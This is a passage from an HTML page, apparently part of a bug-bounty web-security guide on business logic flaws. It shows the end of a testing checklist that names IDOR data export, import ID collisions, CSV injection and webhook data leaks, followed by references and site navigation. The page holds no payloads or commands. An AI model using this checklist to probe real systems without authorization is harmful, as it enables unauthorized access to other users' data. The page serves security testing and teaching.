+</span><span id="__span-23-55"><a id="__codelineno-23-55" name="__codelineno-23-55" href="#__codelineno-23-55"></a>□ Export contains more fields than UI shows
+</span><span id="__span-23-56"><a id="__codelineno-23-56" name="__codelineno-23-56" href="#__codelineno-23-56"></a>□ Export other user&#39;s data via IDOR
+</span><span id="__span-23-57"><a id="__codelineno-23-57" name="__codelineno-23-57" href="#__codelineno-23-57"></a>□ Import overwrites other users&#39; records via ID collision
+</span><span id="__span-23-58"><a id="__codelineno-23-58" name="__codelineno-23-58" href="#__codelineno-23-58"></a>□ CSV injection in import fields (admin opens in Excel)
+</span><span id="__span-23-59"><a id="__codelineno-23-59" name="__codelineno-23-59" href="#__codelineno-23-59"></a>
+</span><span id="__span-23-60"><a id="__codelineno-23-60" name="__codelineno-23-60" href="#__codelineno-23-60"></a>NOTIFICATIONS &amp; WEBHOOKS
+</span><span id="__span-23-61"><a id="__codelineno-23-61" name="__codelineno-23-61" href="#__codelineno-23-61"></a>□ Webhook receives other users&#39; data
+</span><span id="__span-23-62"><a id="__codelineno-23-62" name="__codelineno-23-62" href="#__codelineno-23-62"></a>□ Webhook payload leaks sensitive fields
+</span><span id="__span-23-63"><a id="__codelineno-23-63" name="__codelineno-23-63" href="#__codelineno-23-63"></a>□ Subscribe to notifications for resources you don&#39;t own
+</span><span id="__span-23-64"><a id="__codelineno-23-64" name="__codelineno-23-64" href="#__codelineno-23-64"></a>□ Send notifications to other users
+</span></code></pre></div>
+</details>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0v24h10.718v-3.805l3.496-4.272h-3.496v-5.205H4.427l6.291-7.767V0Zm13.282 0v3.884L9.786 8.155h3.496v5.205h6.291l-6.291 7.767V24H24V0Z"/></svg></span> <strong>PortSwigger Labs</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/web-security/logic-flaws">Business logic vulnerabilities</a></li>
+<li><a href="https://portswigger.net/web-security/race-conditions">Race conditions</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.74 3.74 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574M8.755 4.75l-.004 7.322a3.75 3.75 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25"/></svg></span> <strong>Research</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/research/smashing-the-state-machine">James Kettle — Smashing the state machine (DEF CON 31)</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html">OWASP Business Logic Security Cheat Sheet</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/business-logic-vulnerabilities">HackTricks — Business Logic</a></li>
+</ul>
+</li>
+</ul>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">business-logic</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">race-conditions</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">payment-manipulation</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">workflow-bypass</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">bug-bounty</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../part-05-ssrf-xxe/" class="md-footer__link md-footer__link--prev" aria-label="Previous: SSRF &amp; XXE">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                SSRF & XXE
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../part-07-api/" class="md-footer__link md-footer__link--next" aria-label="Next: API Security">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                API Security
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Wellington Vumu
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+    
+  </body>
+</html>
